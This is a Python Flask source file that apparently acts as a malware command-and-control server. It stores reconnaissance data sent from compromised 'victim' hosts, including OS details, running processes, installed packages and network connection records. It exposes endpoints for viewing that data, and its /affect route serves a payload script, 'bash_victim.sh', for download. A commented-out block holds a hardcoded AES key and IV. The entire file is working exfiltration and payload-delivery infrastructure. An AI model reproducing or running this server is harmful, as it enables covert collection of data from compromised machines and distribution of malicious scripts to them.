from datetime import datetime
import os
from flask import Flask, request, jsonify, send_from_directory
import sqlite3
from flask_cors import CORS
import json

#from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
#from cryptography.hazmat.backends import default_backend
#from cryptography.hazmat.primitives import padding
#import base64

app = Flask(__name__)
CORS(app)

# SECRET_KEY=b'vcwgAyxSnOGMXFRcqG4AEaQuooJkeTfQ'
# IV=b'5183666c72eec9e4'
# print(len(SECRET_KEY))
# Function to decrypt data using AES-256-CBC
# def decrypt_aes256(ciphertext, key, iv):
    # Create a Cipher object using AES-256-CBC
    # cipher = Cipher(algorithms.AES(key), modes.CFB(iv), backend=default_backend())
    # decryptor = cipher.decryptor()
    # decrypted_data = decryptor.update(ciphertext) + decryptor.finalize()
    
    # unpadder = padding.PKCS7(algorithms.AES.block_size).unpadder()
    # unpadded_data = unpadder.update(decrypted_data) + unpadder.finalize()
    
    # return decrypted_data

# def decrypt_data(encrypted_data):
    # Assuming the encrypted data is sent in Base64 format
    
    # Decode Base64
    # encrypted_data = base64.b64decode(encrypted_data)
    # print("Success!")
    # Decrypt using AES-256
    # try:
    # decrypted_data = decrypt_aes256(encrypted_data, SECRET_KEY, IV)
    # return decrypted_data.decode('latin-1')    
    # return jsonify({"decrypted_data": decrypted_data.decode('utf-8')})
    # except Exception as e:
    #     print(e)
    #     print("Failure!")
    #     return jsonify({"error": str(e)}), 400

def create_db():
    """Create a database connection"""
    
    conn = sqlite3.connect('victim_data.db')
    c = conn.cursor()   
    c.execute('''CREATE TABLE IF NOT EXISTS info 
                 (timestamp TEXT, os TEXT, processor TEXT, time TEXT, disk_usage TEXT, memory_usage TEXT, CPU_load TEXT, running_processes TEXT, installed_packages TEXT, uptime TEXT)''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS packets 
                 (timestamp TEXT, src_ip TEXT, dst_ip TEXT, src_port TEXT, dst_port TEXT, pid TEXT)''')
    conn.commit()
    conn.close()

@app.route('/upload', methods=['POST'])
def upload():
    # encrypted_payload = request.get_data()
    
    # # Decrypt the incoming data


    # encrypted_data_base64 = encrypted_payload.ciphertext

    # # Decrypt the incoming data
    # decrypted_data = decrypt_data(encrypted_data_base64)
    # print(str(decrypted_data))
    # data = json.loads(decrypted_data)
    
    data = request.get_data(as_text=True)
    data = json.loads(data)
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    conn = sqlite3.connect('victim_data.db')
    c = conn.cursor()
    print(data)
    c.execute("INSERT INTO info (timestamp, os, processor, time, disk_usage, memory_usage, CPU_load, running_processes, installed_packages, uptime) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)", (timestamp, data["OS"], data["Processor"], data["Time"], data["DiskUsage"], data["MemoryUsage"], data["CPULoad"], data["RunningProcesses"], data["InstalledPackages"], data["Uptime"]))
    conn.commit()
    conn.close()

    return "Data received successfully", 200

@app.route('/upload_packets', methods=['POST'])
def upload_packets():
    data = request.get_data(as_text=True)
    data = json.loads(data)
    #print(data)
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    conn = sqlite3.connect('victim_data.db')
    c = conn.cursor()
    if (len(data["SrcIP"]) > 0 and len(data["DstIP"]) > 0 and len(data["SrcPort"]) > 0):
        
        c.execute("INSERT INTO packets (timestamp, src_ip, dst_ip, src_port, dst_port, pid) VALUES (?, ?, ?, ?, ?, ?)", 
                (timestamp, data["SrcIP"], data["DstIP"], data["SrcPort"], data["DstPort"], data["PID"]))
    conn.commit()
    conn.close()

    return "Packet data received successfully", 200

@app.route('/data', methods=['GET'])
def view_data():
    conn = sqlite3.connect('victim_data.db')
    c = conn.cursor()
    c.execute("SELECT * FROM info")
    rows = c.fetchall()
    conn.close()

    data = [{'Timestamp': row[0], 'OS': row[1], 'Processor': row[2], 'Time': row[3], 'DiskUsage': row[4], 'MemoryUsage': row[5], 'CPULoad': row[6], 'RunningProcesses': row[7], 'InstalledPackages': row[8] , 'Uptime': row[9]} for row in rows]
    
    return jsonify(data)

@app.route('/view_packets', methods=['GET'])
def view_packets():
    conn = sqlite3.connect('victim_data.db')
    c = conn.cursor()
    c.execute("SELECT * FROM packets")
    rows = c.fetchall()
    conn.close()

    packet_data = [{'Timestamp': row[0], 'SrcIP': row[1], 'DstIP': row[2], 'SrcPort': row[3], 'DstPort': row[4], 'PID': row[5]} for row in rows]
    
    return jsonify(packet_data)

SCRIPT_DIRECTORY = os.path.dirname(os.path.abspath(__file__))
SCRIPT_NAME = "bash_victim.sh"
@app.route('/affect', methods=['GET'])
def affect():
    """returns bash victim"""
    try:
        return send_from_directory(SCRIPT_DIRECTORY, SCRIPT_NAME, as_attachment=True)
    except FileNotFoundError:
        return "File not found", 404
if __name__ == '__main__':
    create_db()
    app.run(host='0.0.0.0', port=5000)
